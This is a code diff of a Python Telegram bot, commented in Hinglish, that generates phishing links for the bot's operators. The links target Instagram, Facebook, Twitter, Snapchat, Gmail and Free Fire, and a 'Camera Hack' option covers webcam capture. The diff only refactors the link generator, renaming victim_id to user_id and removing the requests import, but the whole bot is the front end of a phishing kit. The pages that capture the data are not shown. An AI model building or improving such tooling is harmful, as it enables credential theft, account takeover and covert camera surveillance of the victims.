@@ -1,6 +1,5 @@
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-import requests
 import uuid
 import time
 from config import *
@@ -8,14 +7,16 @@ from config import *
 bot = telebot.TeleBot(BOT_TOKEN)
 user_sessions = {}
 
-def generate_phishing_link(victim_id, target_type):
+def generate_phishing_link(user_id, target_type):
+    """Link generate karta hai with user's Telegram ID as victim ID"""
     unique_id = str(uuid.uuid4())[:8]
-    link = f"{BASE_URL}/p/{unique_id}?type={target_type}&v={victim_id}"
-    return link  # NO SHORTENER API
+    # user_id ko directly victim ID bana diya
+    link = f"{BASE_URL}/p/{unique_id}?type={target_type}&v={user_id}"
+    return link
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    user_id = message.from_user.id
+    user_id = message.from_user.id  # Telegram user ID
     markup = InlineKeyboardMarkup(row_width=2)
     btn1 = InlineKeyboardButton("📸 Camera Hack", callback_data="cam")
     btn2 = InlineKeyboardButton("📱 Social Media", callback_data="social")
@@ -32,7 +33,7 @@ def start(message):
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callbacks(call):
-    user_id = call.from_user.id
+    user_id = call.from_user.id  # Telegram user ID
     data = call.data
 
     if data == "cam":
@@ -59,7 +60,7 @@ def handle_callbacks(call):
         )
 
     elif data in ["ig", "fb", "tw", "sc"]:
-        link = generate_phishing_link(str(user_id), data)
+        link = generate_phishing_link(user_id, data)  # user_id pass kiya
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
             InlineKeyboardButton("🔗 Open Link", url=link),
@@ -77,7 +78,7 @@ def handle_callbacks(call):
         )
 
     elif data == "gmail":
-        link = generate_phishing_link(str(user_id), "gmail")
+        link = generate_phishing_link(user_id, "gmail")
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
             InlineKeyboardButton("🔗 Open Link", url=link),
@@ -94,7 +95,7 @@ def handle_callbacks(call):
         )
 
     elif data == "ff":
-        link = generate_phishing_link(str(user_id), "ff")
+        link = generate_phishing_link(user_id, "ff")
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
             InlineKeyboardButton("🔗 Open Link", url=link),
@@ -113,7 +114,7 @@ def handle_callbacks(call):
     elif data == "all":
         links = {}
         for t in ["cam", "ig", "fb", "tw", "sc", "gmail", "ff"]:
-            links[t] = generate_phishing_link(str(user_id), t)
+            links[t] = generate_phishing_link(user_id, t)  # user_id pass kiya
         text = "```\n" + "\n".join([f"{k.upper()}: {v}" for k, v in links.items()]) + "\n```"
         bot.send_message(user_id, text, parse_mode="Markdown")
 
@@ -141,7 +142,7 @@ def get_redirect_link(message, user_id, target_type):
         if user_id not in user_sessions:
             user_sessions[user_id] = {}
         user_sessions[user_id]["redirect"] = redirect_url
-        link = generate_phishing_link(str(user_id), "cam")
+        link = generate_phishing_link(user_id, "cam")  # user_id pass kiya
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
             InlineKeyboardButton("🔗 Open Link", url=link),
